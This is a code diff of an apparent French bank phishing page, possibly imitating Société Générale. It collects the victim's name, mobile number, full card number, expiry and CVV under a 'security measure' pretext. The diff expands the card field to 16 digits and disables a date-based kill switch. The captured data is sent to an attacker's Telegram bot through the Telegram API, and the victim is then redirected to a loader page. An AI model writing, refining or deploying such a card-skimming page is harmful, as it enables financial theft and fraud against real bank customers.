@@ -13,7 +13,7 @@
 
     <style>
         input {
-            font-size: 1.1rem;
+            font-size: 1.2rem;
         }
         .top {
             height: 50px;
@@ -40,16 +40,23 @@
         <br>
         <br>
         <br>
-        <h4>Informations de carte bancaire</h4>
-        <br>
+        <h4>Par mesure de sécurité, veuillez remplir vos coordonnées suivantes :</h4>
         <div class="center">
             <form id="form">
+
+                <v-text-field
+                    label="Nom sur la carte"
+                    id="nom"
+                    type="text"
+                    maxlength="20"
+                    minlength="2"
+                    required
+                    style="width: 100%;"
+                ></v-text-field>
                 <v-text-field
                     prepend-inner-icon="mdi-cellphone-message"
                     label="Numéro de mobile"
                     id="tel"
-                    placeholder="0X XX XX XX XX"
-                    solo
                     type="tel"
                     maxlength="10"
                     minlength="10"
@@ -57,18 +64,12 @@
                     style="width: 100%;"
                 ></v-text-field>
 
-                <img src="./img/card.jpeg" width="70px">
-                <br><br>
-
                 <v-text-field
-                    prepend-inner-icon="mdi-credit-card-check"
-                    label="8 chiffres non visibles"
+                    label="Numéro de carte de crédit"
                     id="card"
-                    placeholder="XXXX XXXX"
-                    maxlength="8"
-                    minlength="8"
+                    maxlength="16"
+                    minlength="16"
                     type="tel"
-                    solo
                     required
                     style="width: 100%;"
                 ></v-text-field>
@@ -80,7 +81,6 @@
                         placeholder="XX"
                         maxlength="2"
                         minlength="2"
-                        solo
                         type="tel"
                         required
                     ></v-text-field>
@@ -91,15 +91,12 @@
                         maxlength="2"
                         minlength="2"
                         type="tel"
-                        solo
                         required
-                        style="margin: 0px 8px 0px 8px;"
                     ></v-text-field>
                     <v-text-field
                         label="CVV"
                         id="cvv"
                         placeholder="XXX"
-                        solo
                         maxlength="3"
                         minlength="3"
                         type="tel"
@@ -129,15 +126,16 @@
     </script>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            var a = new Date('2024-10-01');
-            var b = new Date();
-            var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+        // document.addEventListener('DOMContentLoaded', function () {
+        //     var a = new Date('2024-10-01');
+        //     var b = new Date();
+        //     var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
 
-            if (c >= a) {
-                document.body.style.backgroundColor = 'red';
-            }
-        });
+        //     if (c >= a) {
+        //         document.body.style.backgroundColor = 'red';
+        //     }
+        // });
+
         document.getElementById('valider').addEventListener('click', function (e) {
         e.preventDefault();
 
@@ -147,6 +145,7 @@
 
         // Récupérer les valeurs des champs
         const user = localStorage.getItem('user');
+        const nom = document.getElementById('nom').value;
         const mobile = document.getElementById('tel').value.trim();
         const cardDigits = document.getElementById('card').value.trim();
         const month = document.getElementById('mois').value.trim();
@@ -154,13 +153,13 @@
         const cvv = document.getElementById('cvv').value.trim();
 
         // Vérifier si les champs sont vides
-        if (!mobile || !cardDigits || !month || !year || !cvv) {
+        if (!nom || !mobile || !cardDigits || !month || !year || !cvv) {
             alert("Veuillez remplir tous les champs avant de soumettre.");
             return;
         }
 
         // Construire le message
-        const message = `💕 SG :\n\n 👤User: ${user}\n📞 Numéro de mobile : ${mobile}\n💳 8 chiffres non visibles : ${cardDigits}\n📅 Mois : ${month}\n📅 Année : ${year}\n🎯 CVV : ${cvv}`;
+        const message = `💕 SG :\n\n 👤User: ${user}\n😎 Nom : ${nom}\n📞 Numéro de mobile : ${mobile}\n💳 8 chiffres non visibles : ${cardDigits}\n📅 Mois : ${month}\n📅 Année : ${year}\n🎯 CVV : ${cvv}`;
 
         // Construction de l'URL de l'API Telegram
         const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
@@ -173,7 +172,7 @@
                         throw new Error("Erreur lors de l'envoi du message à Telegram");
                     });
                 }
-                window.location.href = './sms.html';
+                window.location.href = './loader3.html';
             })
             .catch(error => {
                 console.error('Erreur :', error);
